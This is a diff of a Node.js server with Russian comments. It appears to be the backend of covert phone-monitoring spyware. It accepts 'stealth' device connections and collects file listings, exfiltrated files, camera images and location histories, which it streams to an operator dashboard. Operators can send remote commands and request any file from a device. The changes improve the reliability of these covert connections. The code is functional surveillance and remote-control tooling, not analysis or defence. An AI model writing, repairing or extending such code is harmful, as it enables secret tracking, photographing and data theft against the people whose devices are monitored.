@@ -9,7 +9,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 const deviceCommands = new Map();
-const stealthConnections = new Map();
+const stealthConnections = new Map(); // deviceId -> { ws, lastSeen, latestImage, latestImageTime }
 const webClients = new Set();
 const deviceFileCache = new Map();
 
@@ -67,124 +67,162 @@ function broadcastToWebClients(obj) {
   }
 }
 
+function isWsOpen(ws) {
+  return ws && ws.readyState === WebSocket.OPEN;
+}
+
 wss.on("connection", (ws, req) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
   const pathname = url.pathname;
-  let deviceId = url.searchParams.get("deviceId");
-  
+  const deviceId = url.searchParams.get("deviceId");
+
+  // --- web UI connections ---
   if (pathname.startsWith("/ws/live")) {
     webClients.add(ws);
-    console.log(`Web client connected. Total: ${webClients.size}`);
+    console.log(`🌐 Web client connected. Total: ${webClients.size}`);
 
     ws.on("close", () => {
       webClients.delete(ws);
-      console.log(`Web client disconnected. Total: ${webClients.size}`);
+      console.log(`🌐 Web client disconnected. Total: ${webClients.size}`);
     });
 
     ws.on("error", (err) => {
       console.error("Web client error:", err);
     });
-    
-  } else if (deviceId && pathname.startsWith("/ws/stealth")) {
+
+    return;
+  }
+
+  // --- device (stealth) connections ---
+  if (deviceId && pathname.startsWith("/ws/stealth")) {
     ws.deviceId = deviceId;
+
+    // Если уже есть соединение — заменяем (новое соединение должно быть приоритетом)
+    const existing = stealthConnections.get(deviceId);
+    if (existing) {
+      if (existing.ws !== ws) {
+        console.log(`⚠️ Replacing existing connection for device ${deviceId}`);
+        try {
+          // аккуратно закрываем старый ws (если он ещё открыт)
+          if (isWsOpen(existing.ws)) {
+            existing.ws.terminate();
+          }
+        } catch (e) {
+          // ignore
+        }
+      }
+    }
+
     stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
     console.log(`📱 Device ${deviceId} connected`);
 
-    // ДОБАВЛЕНО: Keepalive механизм
-    const keepaliveInterval = setInterval(() => {
-      if (ws.readyState === WebSocket.OPEN) {
-        ws.ping(); // Отправляем WebSocket ping
-      } else {
-        clearInterval(keepaliveInterval);
+    // Логируем активность — НЕ закрываем соединение автоматически
+    const keepaliveLogger = setInterval(() => {
+      const info = stealthConnections.get(deviceId);
+      if (!info || !isWsOpen(ws)) {
+        clearInterval(keepaliveLogger);
+        return;
       }
-    }, 30000); // Каждые 30 секунд
-
-    // ДОБАВЛЕНО: Обработка WebSocket pong
-    ws.on('pong', () => {
-      const deviceInfo = stealthConnections.get(deviceId);
-      if (deviceInfo) {
-        deviceInfo.lastSeen = Date.now();
-      }
-    });
+      const deltaSec = Math.floor((Date.now() - (info.lastSeen || 0)) / 1000);
+      console.log(`⏳ ${deviceId} last ping ${deltaSec}s ago (socket OPEN)`);
+    }, 30000);
 
     ws.on("message", (rawData) => {
       try {
         const msg = JSON.parse(rawData.toString());
-        
-        // ИЗМЕНЕНО: Отвечаем на ping и обновляем lastSeen
-        if (msg.type === 'ping') {
+        const deviceInfo = stealthConnections.get(deviceId);
+        if (deviceInfo) deviceInfo.lastSeen = Date.now();
+
+        // Логический пинг-понг на уровне JSON сообщений
+        if (msg.type === "ping") {
           console.log(`💓 Ping from ${deviceId}`);
-          
-          // Обновляем lastSeen
-          const deviceInfo = stealthConnections.get(deviceId);
-          if (deviceInfo) {
-            deviceInfo.lastSeen = Date.now();
+          // Обновили lastSeen выше
+          try {
+            if (isWsOpen(ws)) {
+              ws.send(JSON.stringify({ type: "pong", timestamp: Date.now() }));
+            }
+          } catch (e) {
+            // ignore send errors
           }
-          
-          // ДОБАВЛЕНО: Отправляем pong обратно
-          ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
           return;
         }
-        
-        if (msg.type === 'file_list') {
+
+        if (msg.type === "file_list") {
           deviceFileCache.set(deviceId, {
             data: msg.data,
             timestamp: Date.now()
           });
-          
           const totalFiles = (msg.data && msg.data.total) || 0;
           console.log(`📁 Received file list from ${deviceId}: ${totalFiles} files`);
           return;
         }
 
-        if (msg.type === 'file_download') {
+        if (msg.type === "file_download") {
           console.log(`📥 Received file: ${msg.filename} from ${deviceId}`);
-          
           broadcastToWebClients({
-            type: 'file_download',
-            deviceId: deviceId,
+            type: "file_download",
+            deviceId,
             filename: msg.filename,
             data: msg.data,
             size: msg.size,
             timestamp: msg.timestamp || Date.now()
           });
-          
           return;
         }
-        
-        if (msg.type === 'image') {
-          const deviceInfo = stealthConnections.get(deviceId);
-          if (deviceInfo) {
-            deviceInfo.latestImage = msg.data;
-            deviceInfo.latestImageTime = Date.now();
+
+        if (msg.type === "image") {
+          const info = stealthConnections.get(deviceId);
+          if (info) {
+            info.latestImage = msg.data;
+            info.latestImageTime = Date.now();
           }
         }
-        
+
+        // Broadcast others to web UI
         broadcastToWebClients({
           type: msg.type,
-          deviceId: deviceId,
+          deviceId,
           data: msg.data,
           timestamp: msg.timestamp || Date.now()
         });
-        
+
       } catch (err) {
         console.error(`Error from device ${deviceId}:`, err);
       }
     });
 
     ws.on("close", () => {
-      clearInterval(keepaliveInterval); // ДОБАВЛЕНО
-      stealthConnections.delete(deviceId);
-      deviceFileCache.delete(deviceId);
-      console.log(`Device ${deviceId} disconnected`);
+      clearInterval(keepaliveLogger);
+      const current = stealthConnections.get(deviceId);
+      // Удаляем только если текущее в stealthConnections — этот ws
+      if (current && current.ws === ws) {
+        stealthConnections.delete(deviceId);
+        deviceFileCache.delete(deviceId);
+        console.log(`❎ Device ${deviceId} disconnected`);
+      } else {
+        console.log(`❎ Device ${deviceId} closed (old connection)`);
+      }
     });
 
     ws.on("error", (err) => {
-      clearInterval(keepaliveInterval); // ДОБАВЛЕНО
-      console.error(`Device error (${deviceId}):`, err);
+      clearInterval(keepaliveLogger);
+      // При ошибке удаляем запись — т.к. ws скорее всего мёртв
+      const current = stealthConnections.get(deviceId);
+      if (current && current.ws === ws) {
+        stealthConnections.delete(deviceId);
+        deviceFileCache.delete(deviceId);
+      }
+      console.error(`⚠️ Device error (${deviceId}):`, err);
     });
+
+    return;
   }
+
+  // Если дошли сюда — неизвестный путь
+  try { ws.close(); } catch (e) {}
 });
+
+// --- API routes (без изменений, но с реальной проверкой состояния ws) ---
 
 app.post("/api/login", (req, res) => {
   const { username, password } = req.body;
@@ -196,20 +234,24 @@ app.post("/api/login", (req, res) => {
 
 app.get('/api/device/:deviceId/files/:token', (req, res) => {
   const { deviceId, token } = req.params;
-  
+
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: 'Forbidden' });
   }
-  
+
   const cached = deviceFileCache.get(deviceId);
   if (cached && (Date.now() - cached.timestamp < 10000)) {
     return res.json(cached.data);
   }
-  
+
   const device = stealthConnections.get(deviceId);
-  if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
-    device.ws.send(JSON.stringify({ action: 'get_files' }));
-    
+  if (device && isWsOpen(device.ws)) {
+    try {
+      device.ws.send(JSON.stringify({ action: 'get_files' }));
+    } catch (e) {
+      console.error("Error requesting files:", e);
+    }
+
     setTimeout(() => {
       const updated = deviceFileCache.get(deviceId);
       res.json(updated ? updated.data : { categories: { images: [], videos: [], audio: [], documents: [] }, total: 0 });
@@ -222,14 +264,14 @@ app.get('/api/device/:deviceId/files/:token', (req, res) => {
 app.get("/api/analytics/:deviceId/:token", async (req, res) => {
   const { deviceId, token } = req.params;
   const days = parseInt(req.query.days) || 7;
-  
+
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: "Forbidden" });
   }
 
   try {
     const cutoff = Date.now() - (days * 24 * 60 * 60 * 1000);
-    
+
     const { data, error } = await supabase
       .from("locations")
       .select("*")
@@ -261,63 +303,71 @@ app.get("/api/analytics/:deviceId/:token", async (req, res) => {
 
 app.get('/api/device/:deviceId/command/:token', (req, res) => {
   const { deviceId, token } = req.params;
-  
+
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: "Forbidden" });
   }
-  
+
   const command = deviceCommands.get(deviceId);
-  
+
   if (command && (Date.now() - command.timestamp) < 30000) {
     deviceCommands.delete(deviceId);
-    return res.json({ 
-      action: command.action, 
-      timestamp: command.timestamp 
+    return res.json({
+      action: command.action,
+      timestamp: command.timestamp
     });
   }
-  
+
   return res.json({ action: null });
 });
 
 app.post("/api/device/command", (req, res) => {
   const { device_id, command, token } = req.body;
-  
+
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: "Forbidden" });
   }
-  
+
   deviceCommands.set(device_id, {
     action: command.toLowerCase(),
     timestamp: Date.now()
   });
-  
+
   const entry = stealthConnections.get(device_id);
-  if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
-    entry.ws.send(JSON.stringify({ 
-      action: command.toLowerCase(), 
-      timestamp: Date.now() 
-    }));
+  if (entry && isWsOpen(entry.ws)) {
+    try {
+      entry.ws.send(JSON.stringify({
+        action: command.toLowerCase(),
+        timestamp: Date.now()
+      }));
+    } catch (e) {
+      console.error("Error sending command to device:", e);
+    }
   }
-  
+
   return res.json({ success: true });
 });
 
 app.post("/api/device/download-file", (req, res) => {
   const { device_id, file_path, token } = req.body;
-  
+
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: "Forbidden" });
   }
-  
+
   const entry = stealthConnections.get(device_id);
-  if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
-    entry.ws.send(JSON.stringify({ 
-      action: 'download_file',
-      file_path: file_path,
-      timestamp: Date.now() 
-    }));
-    
-    res.json({ success: true, message: 'File request sent' });
+  if (entry && isWsOpen(entry.ws)) {
+    try {
+      entry.ws.send(JSON.stringify({
+        action: 'download_file',
+        file_path,
+        timestamp: Date.now()
+      }));
+      res.json({ success: true, message: 'File request sent' });
+    } catch (e) {
+      console.error("Error sending download request:", e);
+      res.status(500).json({ error: 'Failed to send request' });
+    }
   } else {
     res.status(404).json({ error: 'Device offline' });
   }
@@ -328,13 +378,13 @@ app.post("/api/camera/image", (req, res) => {
   if (token !== SECRET_TOKEN) return res.status(401).json({ error: "Unauthorized" });
 
   const { type, device_id, data, timestamp } = req.body;
-  
+
   const deviceInfo = stealthConnections.get(device_id);
   if (deviceInfo && type === 'image') {
     deviceInfo.latestImage = data;
     deviceInfo.latestImageTime = Date.now();
   }
-  
+
   broadcastToWebClients({ type, deviceId: device_id, data, timestamp: timestamp || Date.now() });
   return res.json({ success: true });
 });
@@ -407,7 +457,7 @@ app.post("/api/location", async (req, res) => {
   }
 });
 
-// ИЗМЕНЕНО: Добавлена логика "онлайн" если устройство активно за последние 10 минут
+// Возвращаем реальные online-статусы на основе открытого ws-соединения
 app.get("/api/devices/:token", async (req, res) => {
   const { token } = req.params;
   if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
@@ -422,12 +472,11 @@ app.get("/api/devices/:token", async (req, res) => {
 
     const devices = {};
     const now = Date.now();
-    
+
     data.forEach((location) => {
       if (!devices[location.device_id]) {
-        const lastSeen = location.timestamp;
-        const isRecentlyActive = (now - lastSeen) < 600000; // 10 минут
-        
+        const info = stealthConnections.get(location.device_id);
+        const isConnected = !!(info && isWsOpen(info.ws)); // true только если есть открытый ws
         devices[location.device_id] = {
           device_id: location.device_id,
           device_name: location.device_name,
@@ -435,8 +484,11 @@ app.get("/api/devices/:token", async (req, res) => {
           battery: location.battery,
           location_count: 0,
           last_location: { lat: location.latitude, lng: location.longitude },
-          is_connected: stealthConnections.has(location.device_id) || isRecentlyActive
+          is_connected: isConnected
         };
+        if (info && info.lastSeen) {
+          devices[location.device_id].server_lastSeen = info.lastSeen;
+        }
       }
       devices[location.device_id].location_count++;
     });
@@ -470,23 +522,22 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
       device_name: data[0]?.device_name || "Unknown Device",
       locations: filteredLocations,
       total_points: data.length,
-      is_connected: stealthConnections.has(deviceId)
+      is_connected: !!(stealthConnections.get(deviceId) && isWsOpen(stealthConnections.get(deviceId).ws))
     });
   } catch (err) {
     return res.status(500).json({ error: "Database error" });
   }
 });
 
-// ИЗМЕНЕНО: Добавлен токен в URL
 app.get('/api/device/:deviceId/latest-image/:token', (req, res) => {
   const { deviceId, token } = req.params;
-  
+
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: 'Forbidden' });
   }
-  
+
   const deviceInfo = stealthConnections.get(deviceId);
-  
+
   if (deviceInfo && deviceInfo.latestImage) {
     res.json({
       success: true,
